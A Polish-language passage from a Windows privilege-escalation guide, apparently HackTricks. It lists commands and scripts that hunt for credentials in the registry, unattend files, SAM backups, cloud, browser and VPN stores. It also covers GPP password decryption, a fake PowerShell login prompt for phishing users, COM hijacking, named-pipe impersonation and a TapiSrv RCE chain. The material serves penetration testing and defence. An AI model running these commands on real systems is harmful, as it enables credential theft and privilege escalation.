Osobny plik `Openfire\conf\openfire.xml` może ujawniać skonfigurowane porty konsoli administracyjnej i interfejs powiązania, nawet gdy używana jest zewnętrzna baza danych. Openfire zwykle wiąże konsolę administracyjną z loopback; lokalne konto nadal może połączyć się z tym adresem, jeśli nasłuchujący proces działa. Sprawdź łącznie faktycznie działający nasłuch, autoryzowaną rolę administratora, zasady przesyłania wtyczek i tożsamość usługi Openfire. Administrator mogący zainstalować wtyczkę może spowodować uruchomienie jej kodu w kontekście usługi, który może mieć wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodne hasło konta lub dostępna ścieżka do konfiguracji same w sobie nie dowodzą dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [przewodnik producenta po instalacji i zarządzaniu wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera do zarządzania śledczego

Konfiguracje serwera Velociraptor, zwykle o nazwie `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wystawić certyfikat klienta API. To, czy prowadzi to do wyższych uprawnień, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; jej znalezienie nie potwierdza dostępu do CA serwera. W niektórych wdrożeniach prywatny klucz CA jest przechowywany offline, dlatego czytelna konfiguracja serwera może go nie zawierać.

Na serwerze Windows sprawdź ACL **konfiguracji serwera** w jego katalogu instalacyjnym oraz wszelkich zabezpieczonych kopii zapasowych. Jedna z możliwych lokalizacji to `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli ścieżka skonfigurowana dla usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że `CA.private_key` rzeczywiście w nim występuje. Nie wyświetlaj klucza prywatnego w logach ani wynikach enumeracji. Przepływ pracy producenta `config api_client` używa klucza CA do wystawienia certyfikatu klienta, ale potrzebna jest również efektywna rola po stronie serwera; jej utworzenie lub zmiana może wymagać uprawnień do zapisu w magazynie danych albo ponownego uruchomienia. Istniejąca uprzywilejowana tożsamość serwera może stanowić ścieżkę dostępu nawet wtedy, gdy taki zapis nie jest możliwy. Zapytania API z uprawnieniami do wykonywania działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Zabezpiecz konfigurację serwera i kopie zapasowe restrykcyjnymi ACL, w miarę możliwości przechowuj klucz podpisywania CA offline i ogranicz role API oraz dostęp do nasłuchujących interfejsów. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) i [wskazówki dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Dane logowania PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to osobny menedżer sesji. Jego natywny, zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może nosić nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591) podaje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi i powiązania; [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazuje natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane poświadczenia są nadal prawidłowe lub zapewniają wyższe uprawnienia.

### Klucze hostów SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc sprawdź, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice znajdziesz tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika już nie działa. Próbowałem utworzyć klucze ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh na maszynę. Klucz rejestru HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki instalacji nienadzorowanej

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe hive’y `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wyodrębnieniem czegokolwiek sprawdzaj **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on hive’y, a standardowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często są fałszywymi tropami. Udział SMB to odrębna ścieżka dostępu i należy go sprawdzać tylko wtedy, gdy jest objęty zakresem. Zobacz [wskazówki Microsoftu dotyczące obrazów Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [opis plików hive rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Poświadczenia w chmurze

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Hasło GPP z pamięci podręcznej

Wcześniej dostępna była funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pomocą Group Policy Preferences (GPP). Ta metoda miała jednak poważne luki w zabezpieczeniach. Po pierwsze, obiekty Group Policy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych obiektach GPP, zaszyfrowane algorytmem AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję skanującą lokalnie buforowane pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP i lokalizacji pliku, co ułatwia identyfikację tej luki w zabezpieczeniach i jej usunięcie.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (w systemach starszych niż Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskiwania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Konfiguracja Web w IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config zawierającego dane uwierzytelniające:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu głównym witryny IIS

Stare archiwum ZIP umieszczone bezpośrednio w katalogu głównym witryny udostępnianym przez serwer może ujawnić wcześniejsze pliki konfiguracyjne i dane uwierzytelniające, których można ponownie użyć. Sprawdź skonfigurowaną ścieżkę fizyczną witryny oraz to, czy archiwum jest faktycznie dostępne przez HTTP, zanim uznasz to za ujawnienie. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie swoich danych uwierzytelniających lub nawet danych innego użytkownika**, jeśli sądzisz, że może je znać (pamiętaj, że bezpośrednie **proszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** w **postaci jawnego tekstu** lub Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 często używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; sama jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć zapisanych w nim danych uwierzytelniających. Podczas sprawdzania lokalizacji takich plików przejrzyj dostępne profile użytkowników i skonfigurowane katalogi główne udostępniania plików.

Czytelny plik KeePass `.kdbx` jest również jedynie wskazówką prowadzącą do zaszyfrowanego sejfu. Do jego odblokowania potrzebne jest rzeczywiste hasło główne oraz wszelkie skonfigurowane pliki kluczy lub czynniki związane z kontem. Jeśli podczas autoryzowanego przeglądu znajdziesz w jednym z wpisów parę hashy LM:NT, zweryfikuj wskazane konto oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Sam wpis w sejfie nie nadaje uprawnień Administratora ani SYSTEM; dostęp do usługi zdalnej, uprawnienia konta i ewentualny odrębny etap uruchomienia usługi również muszą być spełnione. Inwentaryzacja powinna podawać ścieżkę do sejfu i informację o możliwości jego odczytu, a nie wyświetlać bazy danych ani zapisanych danych uwierzytelniających.

Wyszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Poświadczenia w Koszu

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wyraźnie wspominają o poświadczeniach. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. Windows zapisuje oryginalną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako powiązany z nim wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, identyfikatora SID użytkownika i uprawnień do plików, więc pusta lista nie dowodzi, że nie ma żadnej możliwej do odzyskania kopii zapasowej. Traktuj nazwę archiwum jako wskazówkę do sprawdzenia, a nie dowód, że zawiera ono prawidłowy sekret.

Dostępny usunięty plik `.pfx` może też być wskazówką dotyczącą **podpisywania kodu**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmieniony skrypt PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker oceniają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na koncie innego użytkownika wymaga, aby bieżąca tożsamość mogła zmodyfikować konkretny skrypt, obowiązująca reguła akceptowała jego wynikowy podpis dla skryptu i konta docelowego, a zaplanowane zadanie lub inny proces o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, temat certyfikatu ani możliwość zapisu do skryptu nie dowodzą, że taki ciąg zależności istnieje. Przed otwarciem materiału zawierającego klucz prywatny lub uruchomieniem zadania sprawdź metadane, listy ACL, zasady i polecenie zaplanowanego zadania.

Sprawdź też dostępne bazy profili klientów komunikacyjnych, notatki i odebrane pliki pod kątem wskazówek dotyczących poświadczeń. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem w archiwum kopii zapasowej o opisowej nazwie. Takie materiały mogą umożliwić dostęp do osobnego, zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz do tego uprawnienia. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie poświadczeń domenowych w trybie offline wymaga również pasującego ula `SYSTEM`, jak opisano w [procedurze dotyczącej kopii zapasowych i uprzywilejowanych grup](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików ani zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania lub kopia zapasowa domeny.

Aby **odzyskać hasła** zapisane przez różne programy, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające poświadczenia**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Wyodrębnianie kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądania

Sprawdź bazy danych, w których mogą być przechowywane hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione przeglądarek — być może są tam zapisane **hasła**.

W przypadku standardowego profilu Edge **Default** bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a `Local State` — w nadrzędnym katalogu `User Data`. [Microsoft opisuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` mogą zmienić tę lokalizację. Sama obecność plików jest jedynie wskazówką, że mogą zawierać dane logowania: potwierdź, że pliki są czytelne, dostępny jest kontekst DPAPI odpowiedniego użytkownika lub inne autoryzowane materiały kluczowe oraz że zapisany login należy do konta o wyższych uprawnieniach. Samo wyszukiwanie ścieżek nie musi otwierać bazy danych ani wyświetlać odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla informuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu są sparowanymi plikami klucza i zaszyfrowanych danych logowania. Ich obecność jest jedynie wskazówką: sprawdź, czy oba pliki są czytelne, czy istnieją zapisane wpisy oraz czy klucz jest chroniony hasłem głównym (Primary Password), zanim uznasz, że dane logowania można wykorzystać. Jeśli odzyskane dane logowania należą do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do zarządzania grupami oraz [uprawnienia grupy do odczytu lub odszyfrowywania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie potwierdzają ścieżki do uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Nadpisywanie bibliotek DLL COM**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy komponent udostępnia funkcjonalność za pośrednictwem jednego lub kilku interfejsów identyfikowanych za pomocą identyfikatorów interfejsów (IID).

Klasy i interfejsy COM są definiowane odpowiednio w rejestrze w lokalizacjach **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wśród identyfikatorów CLSID w tym rejestrze można znaleźć podrzędny klucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **bibliotekę DLL** oraz wartość **ThreadingModel**, która może mieć wartość **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątku).

![Historia przeglądania - Nadpisywanie bibliotek DLL COM: Wśród identyfikatorów CLSID w tym rejestrze można znaleźć podrzędny klucz InProcServer32, który zawiera wartość domyślną wskazującą na bibliotekę DLL oraz wartość...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolną z bibliotek DLL**, które zostaną uruchomione, możesz **eskalować uprawnienia**, jeśli tę bibliotekę DLL uruchomi inny użytkownik.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrwalania dostępu, zobacz:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukaj plik o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Wyszukaj w rejestrze nazwy kluczy i hasła**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia do wyszukiwania haseł

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf**. Stworzyłem go, aby **automatycznie uruchamiać każdy moduł POST Metasploit, który wyszukuje poświadczeń** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wspomniane na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** w przypadku kilku narzędzi, które zapisują te dane jawnym tekstem (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Ujawnione uchwyty

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu głównego**.\
Jeśli więc masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do uprzywilejowanego procesu utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o tym, **jak wykryć i wykorzystać tę podatność**.](leaked-handle-exploitation.md)\
[Przeczytaj też **ten wpis, w którym dokładniej wyjaśniono, jak testować i nadużywać innych otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonacja klienta Named Pipe

Segmenty pamięci współdzielonej, zwane **potokami**, umożliwiają komunikację między procesami i transfer danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, która pozwala niezależnym procesom współdzielić dane, nawet w różnych sieciach. Przypomina to architekturę klient/serwer, w której role określa się jako **serwer named pipe** i **klient named pipe**.

Gdy **klient** wysyła dane przez potok, **serwer**, który go skonfigurował, może **przyjąć tożsamość** **klienta**, o ile ma wymagane uprawnienie **SeImpersonate**. Znalezienie **uprzywilejowanego procesu**, który komunikuje się przez potok, pod który możesz się podszyć, daje możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez Ciebie potokiem. Instrukcje przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie umożliwia również **przechwytywanie komunikacji named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a to narzędzie pozwala wyświetlić listę wszystkich potoków i znaleźć privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Zdalny zapis DWORD przez Telephony tapsrv prowadzący do RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny uwierzytelniony klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby zmienić `ClientAttach` w dowolny **zapis 4 bajtów** do istniejącego pliku, do którego zapis ma `NETWORK SERVICE`, a następnie uzyskać uprawnienia administratora Telephony i załadować dowolny DLL jako usługa. Pełny przebieg:

- Wywołaj `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje kontrolowany przez atakującego `InitContext` z `Initialize` do tego uchwytu. Zarejestruj aplikację linii za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz dane przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj się/wyłącz usługę, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką DLL, aby wykonać `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej szczegółów:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać programy w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużycie obsługi protokołów / ShellExecute przez renderery Markdown

Klikalne linki Markdown przekazane do `ShellExecuteExW` mogą uruchamiać niebezpieczne obsługi URI (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń w poszukiwaniu haseł**

